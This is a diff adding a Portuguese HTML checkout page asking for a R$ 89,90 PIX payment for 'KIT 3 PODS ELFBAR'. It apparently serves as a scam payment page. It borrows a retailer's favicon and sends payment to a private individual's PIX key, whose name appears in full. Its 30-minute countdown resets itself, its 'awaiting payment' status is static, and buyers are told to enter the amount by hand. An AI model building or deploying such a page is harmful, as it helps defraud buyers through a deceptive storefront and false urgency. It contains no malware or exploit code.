@@ -1,0 +1,261 @@
+<html lang="pt-BR">
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>Pagamento via PIX</title>
+  <link rel="icon" type="image/png" href="https://www.nadir.com.br/mobify/bundle/199/static/img/payment-methods/pix.png">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: ;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #555;
+    }
+    .header, .footer {
+      width: 100%;
+      background-color: #007BFF;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+    }
+    .header img {
+      max-width: 200px;
+      height: auto;
+    }
+    .container {
+      background-color: #fff;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      border-radius: 10px;
+      max-width: 100%;
+      width: 100%;
+      margin-top: ;
+      box-sizing: border-box;
+    }
+    h1 {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+    .info {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px;
+      border-radius: 8px;
+      background-color: #fafafa;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+    }
+    .label {
+      font-weight: bold;
+      color: #555;
+    }
+    .value {
+      color: #000;
+    }
+    .qr-container {
+      display: flex;
+      justify-content: center;
+      margin: 23px 0;
+      border: 2px dashed #ccc;
+      width: 200px;
+      height: 200px;
+      align-items: center;
+      background-color: #f9f9f9;
+      border-radius: 8px;
+    }
+    .pix-key-container {
+      background-color: #f0f0f0;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .pix-key-container p {
+      margin: 0;
+      word-break: break-all;
+    }
+    .copy-button {
+      background-color: #28a745;
+      color: #fff;
+      border: none;
+      padding: 10px;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+    }
+    .copy-button:hover {
+      background-color: #218838;
+    }
+    .timer {
+      font-size: 20px;
+      color: #ff0000;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .instructions {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .instruction-step {
+      background-color: #fafafa;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    .footer {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background-color: #007BFF;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+      box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
+    }
+    @media (max-width: 100%) {
+      .container {
+        padding: 19px;
+      }
+      .info {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .label, .value {
+        width: 100%;
+      }
+      .copy-button {
+        font-size: 14px;
+      }
+    }
+  </style> 
+
+  <style>
+     .loading {
+            display: inline-block;
+            animation: dots 1.5s infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: ""; }
+            20%, 40% { content: "."; }
+            40%, 60% { content: ".."; }
+            60%, 80% { content: "..."; }
+            80%, 100% { content: ""; }
+        }
+  </style>
+
+<header>
+  <img src="c1.png" alt="Imagem do Cabeçalho" style="width: 100%; height: auto;">
+</header>
+
+  <script>
+    function copiarChave() {
+      const chavePix = document.getElementById('pix-key').innerText;
+      navigator.clipboard.writeText(chavePix).then(() => {
+        alert('Chave Pix copiada com sucesso!');
+      });
+    }
+
+    function startTimer(duration, display) {
+      let timer = duration, minutes, seconds;
+      setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        display.textContent = minutes + ":" + seconds;
+
+        if (--timer < 0) {
+          timer = duration;
+        }
+      }, 1000);
+    }
+
+    window.onload = function () {
+      const params = new URLSearchParams(window.location.search);
+      document.getElementById('plano').innerText = params.get('plano');
+      document.getElementById('validade').innerText = params.get('validade');
+      document.getElementById('numero').innerText = params.get('numero');
+      document.getElementById('valorPlano').innerText = params.get('plano');
+
+      const thirtyMinutes = 60 * 30,
+        display = document.querySelector('#time');
+      startTimer(thirtyMinutes, display);
+    };
+  </script> 
+ </head> 
+ <body> 
+  <div class="container"> 
+   <h1> Escaneie o nosso QR Code abaixo ou clique no botão para copiar a chave PIX </h1> 
+   <br>
+   <div class="info"> 
+    <div class="label">
+      Valor final do carrinho: R$ 89,90
+    </div> 
+    <div class="value" id="plano"></div> 
+   </div> 
+   <div class="info"> 
+    <div class="label">
+      Copie o código ou escaneie o QR Code 
+    </div> 
+    <div class="value" id="validade"></div> 
+   </div> 
+   <div class="info"> 
+    <div class="label">
+      Aguardando o pagamento...<span class="loading"></span>
+  </div> 
+    <div class="value" id="numero"></div> 
+   </div> 
+   <center>
+   <img src="data:image/png;base64,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"> 
+   </center>
+   <br>
+   <div class="pix-key-container"> 
+    <p id="pix-key">00020126850014BR.GOV.BCB.PIX01365d118953-b847-4fb1-9971-5392a25fccac0223KIT 3 PODS ELFBAR TE 5K520400005303986540589.905802BR5925MARIA DO CARMO PEREIRA DO6008Salvador61084010017062070503***6304D9DE</p> 
+    <button class="copy-button" onclick="copiarChave()">CLIQUE AQUI PARA COPIAR A CHAVE PIX</button> 
+   </div> 
+   <div class="timer">
+     Pagamento expira em: 
+    <span id="time">30:00</span> 
+   </div> 
+   <div class="info"> 
+    <div class="label">
+      Caso não saiba como pagar, aqui vai algumas dicas: 
+    </div> 
+    <div class="value" id="valorPlano"></div> 
+   </div> 
+   <div class="instructions"> 
+    <div class="instruction-step"> 
+     <strong>1.</strong> Abra o aplicativo do seu banco. 
+    </div> 
+    <div class="instruction-step"> 
+     <strong>2.</strong> Procure pela opção de pagamento via PIX. 
+    </div> 
+    <div class="instruction-step"> 
+     <strong>3.</strong> Escaneie o código QR exibido acima. 
+    </div> 
+    <div class="instruction-step"> 
+     <strong>4.</strong> Confirme o pagamento e pronto! 
+    </div> 
+    <div class="instruction-step"> 
+     <strong>5.</strong> Caso tenha dificuldades, copie a chave PIX acima e cole no campo de chave no seu aplicativo bancário. 
+    </div> 
+    <div class="instruction-step"> 
+     <strong>6.</strong> Se o valor estiver zerado, edite o valor para corresponder ao valor final do seu carrinho.
+    </div> 
+   </div> 
+  </div> 
+  <footer>
+    <img src="p3.png" alt="Imagem do Rodapé" style="width: 100%; height: auto;">
+</footer>
+ </body>
+</html>
